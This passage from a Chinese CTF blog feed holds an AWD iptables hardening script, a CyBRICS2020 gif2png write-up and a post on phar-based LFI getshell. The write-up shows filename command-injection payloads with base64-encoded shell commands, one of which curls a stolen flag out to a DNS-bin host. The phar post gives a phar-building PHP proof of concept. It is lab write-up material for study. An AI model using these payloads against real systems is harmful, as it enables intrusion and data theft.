class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#Allow youself Ping other hosts , prohibit others Ping you</span><br><span class="line">iptables ‐A INPUT ‐p icmp ‐‐icmp‐type 8 ‐s 0/0 ‐j DROP</span><br><span class="line">iptables ‐A OUTPUT ‐p icmp ‐‐icmp‐type 8 ‐s 0/0 ‐j ACCEPT</span><br><span class="line">#Close all INPUT FORWARD OUTPUT, just open some ports</span><br><span class="line">iptables ‐P INPUT DROP</span><br><span class="line">iptables ‐P FORWARD DROP</span><br><span class="line">iptables ‐P OUTPUT DROP</span><br><span class="line">#Open ssh</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 22 ‐j ACCEPT</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 22 ‐j ACCEPT</span><br><span class="line">#Open port 80</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 80 ‐j ACCEPT</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 80 ‐j ACCEPT</span><br><span class="line">#Open multiport</span><br><span class="line">#iptables ‐A INPUT ‐p tcp ‐m multiport ‐‐dport 22,80,8080,8081 ‐j ACCEPT</span><br><span class="line">#Control IP connection</span><br><span class="line">#The maximum number of connections for a single IP is 30</span><br><span class="line">iptables ‐I INPUT ‐p tcp ‐‐dport 80 ‐m connlimit ‐‐connlimit‐above 30 ‐j RE</span><br><span class="line">JECT</span><br><span class="line">#A single IP allows up to 15 new connections in 60 seconds</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 80 ‐m recent ‐‐name BAD_HTTP_ACCESS ‐‐upda</span><br><span class="line">te ‐‐seconds 60 ‐‐hitcount 15 ‐j REJECT</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 80 ‐m recent ‐‐name BAD_HTTP_ACCESS ‐‐set</span><br><span class="line">‐j ACCEPT</span><br><span class="line">#Prevent port reuse</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 22 ‐m state ‐‐state ESTABLISHED ‐j ACCEPT</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 80 ‐m state ‐‐state ESTABLISHED ‐j ACCEPT</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 443 ‐m state ‐‐state ESTABLISHED ‐j ACCEP</span><br><span class="line">T</span><br><span class="line">#Filter abnormal packets</span><br><span class="line">iptables ‐A INPUT ‐i eth1 ‐p tcp ‐‐tcp‐flags SYN,RST,ACK,FIN SYN ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL FIN,URG,PSH ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL NONE ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL SYN,RST,ACK,FIN,URG ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL SYN,FIN,RST ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL SYN,FIN,PSH ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL SYN,FIN,RST,PSH ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags SYN,RST SYN,RST ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags SYN,FIN SYN,FIN ‐j DROP</span><br><span class="line">#Prevent DoS attacks</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 80 ‐m limit ‐‐limit 20/minute ‐‐limit‐burs</span><br><span class="line">t 100 ‐j ACCEPT</span><br><span class="line">#Discard unfamiliar TCP response packs to prevent rebound attacks</span><br><span class="line">iptables ‐A INPUT ‐m state ‐‐state NEW ‐p tcp ! ‐‐syn ‐j DROP</span><br><span class="line">iptables ‐A FORWARD ‐m state ‐‐state NEW ‐p tcp ‐‐syn ‐j DROP</span><br></pre></td></tr></table></figure><br>waf配置<br>上通防可能会被监测到，比赛加固30分钟完事后，开始比赛就上waf，每个php文件首行<br>require_once(‘waf.php’);，但是要注意不要影响正常的访问<br>如果一些熟悉的cms去配置文件更改，如include文件夹，默认每个文件都会include<br>waf去github搜<br>查看用户<br>w<br>踢出用户:xxx<br>不死马删除<br>利用bash脚本条件竞争的方式循环删除<br>一句话shell<br>查看端口状态netstat<br>ps ‐a<br>kill进程等<br>脚本<br>建议将文件保存在本地，5分钟还原一次服务器<br>```</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打了一场线下市赛,为awd模式，每个队伍两台靶机防守，一台web1是typecho，一台web2是YznCMSV1.0，前期准备是两个防守，一个攻击，当进入比赛时，环境出了问题，我这个攻击选手进不去，加固时间都已经过了，我赶紧连上去以后下载源码，D盾一扫发现几个木马，&lt;br</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CyBRICS2020</title>
    <link href="https://iloveflag.github.io/2020/08/05/CyBRICS2020/"/>
    <id>https://iloveflag.github.io/2020/08/05/CyBRICS2020/</id>
    <published>2020-08-05T09:50:45.000Z</published>
    <updated>2025-02-14T14:45:19.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="gif2png"><a href="#gif2png" class="headerlink" title="gif2png"></a>gif2png</h1><p>Environment:(<a href="https://github.com/iloveflag/CTF_Training_Warehouse/CyBRICS2020/gif2png">https://github.com/iloveflag/CTF_Training_Warehouse/CyBRICS2020/gif2png</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, flash, send_from_directory</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;********************************&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">500</span> * <span class="number">1024</span>  <span class="comment"># 500Kb</span></span><br><span class="line">ffLaG = <span class="string">&quot;cybrics&#123;********************************&#125;&quot;</span></span><br><span class="line">Bootstrap(app)</span><br><span class="line">logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            logging.debug(<span class="string">&#x27;No file part&#x27;</span>)</span><br><span class="line">            flash(<span class="string">&#x27;No file part&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            logging.debug(<span class="string">&#x27;No selected file&#x27;</span>)</span><br><span class="line">            flash(<span class="string">&#x27;No selected file&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">            logging.debug(<span class="string">f&#x27;Invalid file extension of file: <span class="subst">&#123;file.filename&#125;</span>&#x27;</span>)</span><br><span class="line">            flash(<span class="string">&#x27;Invalid file extension&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file.content_type != <span class="string">&quot;image/gif&quot;</span>:</span><br><span class="line">            logging.debug(<span class="string">f&#x27;Invalid Content type: <span class="subst">&#123;file.content_type&#125;</span>&#x27;</span>)</span><br><span class="line">            flash(<span class="string">&#x27;Content type is not &quot;image/gif&quot;&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bool</span>(re.<span class="keyword">match</span>(<span class="string">&quot;^[a-zA-Z0-9_\-. &#x27;\&quot;\=\$\(\)\|]*$&quot;</span>, file.filename)) <span class="keyword">or</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">            logging.debug(<span class="string">f&#x27;Invalid symbols in filename: <span class="subst">&#123;file.content_type&#125;</span>&#x27;</span>)</span><br><span class="line">            flash(<span class="string">&#x27;Invalid filename&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename))</span><br><span class="line"></span><br><span class="line">            mime_type = filetype.guess_mime(<span class="string">f&#x27;uploads/<span class="subst">&#123;file.filename&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> mime_type != <span class="string">&quot;image/gif&quot;</span>:</span><br><span class="line">                logging.debug(<span class="string">f&#x27;Invalid Mime type: <span class="subst">&#123;mime_type&#125;</span>&#x27;</span>)</span><br><span class="line">                flash(<span class="string">&#x27;Mime type is not &quot;image/gif&quot;&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">            uid = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">            os.mkdir(<span class="string">f&quot;uploads/<span class="subst">&#123;uid&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            logging.debug(<span class="string">f&quot;Created: <span class="subst">&#123;uid&#125;</span>. Command: ffmpeg -i &#x27;uploads/<span class="subst">&#123;file.filename&#125;</span>&#x27; \&quot;uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            command = subprocess.Popen(<span class="string">f&quot;ffmpeg -i &#x27;uploads/<span class="subst">&#123;file.filename&#125;</span>&#x27; \&quot;uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\&quot;&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">            command.wait(timeout=<span class="number">15</span>)</span><br><span class="line">            logging.debug(command.stdout)</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">&#x27;Successfully saved&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;result&#x27;</span>, uid=uid))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;form.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/result/&lt;uid&gt;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">result</span>(<span class="params">uid</span>):</span><br><span class="line">    images = []</span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> os.listdir(<span class="string">f&quot;uploads/<span class="subst">&#123;uid&#125;</span>&quot;</span>):</span><br><span class="line">        mime_type = filetype.guess(<span class="built_in">str</span>(Path(<span class="string">&quot;uploads&quot;</span>) / uid / image))</span><br><span class="line">        <span class="keyword">if</span> image.endswith(<span class="string">&quot;.png&quot;</span>) <span class="keyword">and</span> mime_type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> mime_type.EXTENSION == <span class="string">&quot;png&quot;</span>:</span><br><span class="line">            images.append(image)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;result.html&quot;</span>, uid=uid, images=images)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/uploads/&lt;uid&gt;/&lt;image&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image</span>(<span class="params">uid, image</span>):</span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line">    <span class="built_in">dir</span> = <span class="built_in">str</span>(Path(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]) / uid)</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="built_in">dir</span>, image)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">413</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_entity_too_large</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;File is too large&quot;</span>, <span class="number">413</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>定位到这一行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command = subprocess.Popen(<span class="string">f&quot;ffmpeg -i &#x27;uploads/<span class="subst">&#123;file.filename&#125;</span>&#x27; \&quot;uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\&quot;&quot;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><br>可知这是一道命令执行题</p><p><img src="https://cdn.jsdelivr.net/gh/iloveflag/images/20200805141940.png" alt="20200805141940"><br>先将上传的gif图像保存在uploads下，利用ffmpeg命令将gif分解到对应的uid文件夹下，此时uid为06d62ee7-1b99-4a4c-9397-a601f5565bd7</p><p>则此时{file.filename} 文件名可控造成漏洞<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bool</span>(re.<span class="keyword">match</span>(<span class="string">&quot;^[a-zA-Z0-9_\-. &#x27;\&quot;\=\$\(\)\|]*$&quot;</span>, file.filename)) <span class="keyword">or</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        logging.debug(<span class="string">f&#x27;Invalid symbols in filename: <span class="subst">&#123;file.content_type&#125;</span>&#x27;</span>)</span><br><span class="line">        flash(<span class="string">&#x27;Invalid filename&#x27;</span>, <span class="string">&#x27;danger&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(request.url)</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MALICIOUS_NAME&#x27;||MALICIOUS SYTEM COMMAND HERE||&#x27;</span><br><span class="line"></span><br><span class="line">ffmpeg -i &#x27;uploads/MALICIOUS_NAME&#x27;||MALICIOUS SYTEM COMMAND HERE||&#x27; &quot;uploads/&#123;uid&#125;/%03d.png\&quot;</span><br></pre></td></tr></table></figure><p>且要绕过正则，采用base64的方法绕过<br>将main.py复制到uid目录下<br>payload为<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp main.py uploads/06d62ee7-1b99-4a4c-9397-a601f5565bd7/flag.png</span><br></pre></td></tr></table></figure><br>base64后:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y3AgbWFpbi5weSB1cGxvYWRzLzA2ZDYyZWU3LTFiOTktNGE0Yy05Mzk3LWE2MDFmNTU2NWJkNy9mbGFnLnBuZw==</span><br></pre></td></tr></table></figure><br>执行语句为：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Y3AgbWFpbi5weSB1cGxvYWRzLzA2ZDYyZWU3LTFiOTktNGE0Yy05Mzk3LWE2MDFmNTU2NWJkNy9mbGFnLnBuZw==|base64 -d|sh</span><br></pre></td></tr></table></figure></p><p>则拼接后的payload为:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;||echo Y3AgbWFpbi5weSB1cGxvYWRzLzA2ZDYyZWU3LTFiOTktNGE0Yy05Mzk3LWE2MDFmNTU2NWJkNy9mbGFnLnBuZw==|base64 -d|sh||&#x27;.gif</span><br></pre></td></tr></table></figure></p><p><img src="https://cdn.jsdelivr.net/gh/iloveflag/images/20200805170052.png" alt="20200805170052"></p><p>随后访问<br><a href="http://192.168.10.128:5000/uploads/06d62ee7-1b99-4a4c-9397-a601f5565bd7/flag.png">http://192.168.10.128:5000/uploads/06d62ee7-1b99-4a4c-9397-a601f5565bd7/flag.png</a></p><p>二进制打开看到源码及flag</p><p>有很多writeup写着反弹shell因为防火墙原因无法回弹，采用dnsbin的方法收flag<br>(<a href="https://nullarmor.github.io/posts/cybrics-gif2png">https://nullarmor.github.io/posts/cybrics-gif2png</a>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=$(cat main.py|grep -wo cybrics&#123;.*|base64|tr -d &#x27;=&#x27;);curl $flag.970786bab153cc7ab999.d.zhack.ca</span><br></pre></td></tr></table></figure><p>tip:dnsbin不会接收太多数据，所以要先正则过滤一下<br>base64<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy45NzA3ODZiYWIxNTNjYzdhYjk5OS5kLnpoYWNrLmNh</span><br></pre></td></tr></table></figure><br>payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;||echo ZmxhZz0kKGNhdCBtYWluLnB5fGdyZXAgLXdvIGN5YnJpY3N7Lip8YmFzZTY0fHRyIC1kICc9Jyk7Y3VybCAkZmxhZy45NzA3ODZiYWIxNTNjYzdhYjk5OS5kLnpoYWNrLmNh|base64 -d|sh||&#x27;.gif</span><br></pre></td></tr></table></figure></p><p><img src="https://cdn.jsdelivr.net/gh/iloveflag/images/20200805173230.png" alt="20200805173230"></p><p>但是dnsbin并不区分大小写，base64可能卡住<br>还有一些写入本地图片的操作(<a href="https://ctftime.org/task/12512">https://ctftime.org/task/12512</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;gif2png&quot;&gt;&lt;a href=&quot;#gif2png&quot; class=&quot;headerlink&quot; title=&quot;gif2png&quot;&gt;&lt;/a&gt;gif2png&lt;/h1&gt;&lt;p&gt;Environment:(&lt;a href=&quot;https://github.com/iloveflag</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>浅谈phar文件在ctf中的应用</title>
    <link href="https://iloveflag.github.io/2020/07/09/%E6%B5%85%E8%B0%88phar%E6%96%87%E4%BB%B6%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://iloveflag.github.io/2020/07/09/%E6%B5%85%E8%B0%88phar%E6%96%87%E4%BB%B6%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2020-07-09T13:39:15.000Z</published>
    <updated>2025-02-14T14:45:19.325Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phar在文件上传限制与lfi结合中getshell（2020腾讯犀牛鸟）"><a href="#phar在文件上传限制与lfi结合中getshell（2020腾讯犀牛鸟）" class="headerlink" title="phar在文件上传限制与lfi结合中getshell（2020腾讯犀牛鸟）"></a>phar在文件上传限制与lfi结合中getshell（2020腾讯犀牛鸟）</h2><p><a href="https://github.com/iloveflag/CTF_Training_Warehouse/tree/master/phar_getshell">Environment</a><br>针对phar://不管后缀是什么，都会当做压缩包来解压。<br><strong>phar文件本质上是也一种压缩文件。</strong></p><p>用法：?file=phar://[压缩包文件相对路径]/[压缩文件内的子文件名]</p><h3 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h3><p>将test.php压缩成test.zip,后缀改为test.txt上传<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//test.php</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200705095015019_23.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200705095158868_11324.png" alt=""><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200705095843415_12665.png" alt=""><br>因为可以看到<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$inc=sprintf(&quot;%s.php&quot;,$file);</span><br></pre></td></tr></table></figure><br>这也是为什么我们一开始要用test.php生成压缩包的原因</p><h3 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h3><p>当然，在前面也说了phar本身就是一个压缩文件，所以可以看到很多wp上会先生成phar文件（===压缩包），然后改后缀上传<br>All Phar archives contain three to four sections:</p><p>1.a stub<br>A Phar’s stub is a simple PHP file. The smallest possible stub follows:<br><code>&lt;?php __HALT_COMPILER();</code><br>2.a manifest describing the contents<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200705100620719_9380.png" alt=""><br>3.the file contents<br>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化<br>4.[optional] a signature for verifying Phar integrity (phar file format only)<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200705100805434_19118.png" alt=""></p><p>tip: php.ini中必须设置phar.readonly=Off。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Test&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(&quot;test.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new Test();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.php&quot;, &quot;&lt;?php phpinfo();&quot;); //添加要压缩的文件</span><br><span class="line">    $phar-&gt;stopBuffering();    //签名自动计算</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/20200705104136862_12573.png" alt=""></p><h2 id="phar与反序列化"><a href="#phar与反序列化" class="headerlink" title="phar与反序列化"></a>phar与反序列化</h2><p><a href="https://blog.lou00.top/27/D3ctf-2019-Official-Writeup-ezupload/index.html">https://blog.lou00.top/27/D3ctf-2019-Official-Writeup-ezupload/index.html</a></p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;phar在文件上传限制与lfi结合中getshell（2020腾讯犀牛鸟）&quot;&gt;&lt;a href=&quot;#phar在文件上传限制与lfi结合中getshell（2020腾讯犀牛鸟）&quot; class=&quot;headerlink&quot; title=&quot;phar在文件上传限制与lfi结合中</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://iloveflag.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
